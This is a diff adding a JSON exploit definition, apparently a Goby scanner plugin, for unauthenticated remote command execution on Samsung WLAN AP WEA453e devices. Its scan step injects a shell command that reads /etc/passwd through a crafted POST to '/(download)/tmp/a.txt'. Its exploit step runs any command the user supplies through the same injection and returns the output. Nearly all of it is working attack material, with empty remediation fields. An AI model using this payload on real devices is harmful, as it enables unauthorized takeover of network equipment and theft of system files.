@@ -1,0 +1,81 @@
+{
+      "Name": "Samsung WLAN AP WEA453e RCE",
+      "Level": "3",
+      "Tags": [],
+      "GobyQuery": "title==\"Samsung WLAN AP\"",
+      "Description": "Samsung WLAN AP WEA453e router has a remote command execution vulnerability, which can execute arbitrary commands without authorization to obtain server permissions",
+      "Product": "Samsung WLAN AP WEA453e",
+      "Homepage": "https://www.samsung.com/",
+      "Author": "AndU",
+      "Impact": "<p>暂无</p>",
+      "Recommandation": "<p>暂无</p>",
+      "References": [
+            "Internet"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/(download)/tmp/a.txt",
+                        "follow_redirect": true,
+                        "header": {
+                              "Connection": "close",
+                              "Content-Length": "48"
+                        },
+                        "data_type": "text",
+                        "data": "command1=shell:cat /etc/passwd| dd of=/tmp/a.txt"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/(download)/tmp/a.txt",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/json;charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "command1=shell:{{{Cmd}}}| dd of=/tmp/a.txt"
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "HasExp": true,
+      "ExpParams": [
+          {
+                "name": "Cmd",
+                "type": "input",
+                "value": "ifconfig",
+                "show": ""
+          }
+      ],
+      "PostTime": "2021-04-01 11:47:39",
+      "GobyVersion": "1.8.237"
+}
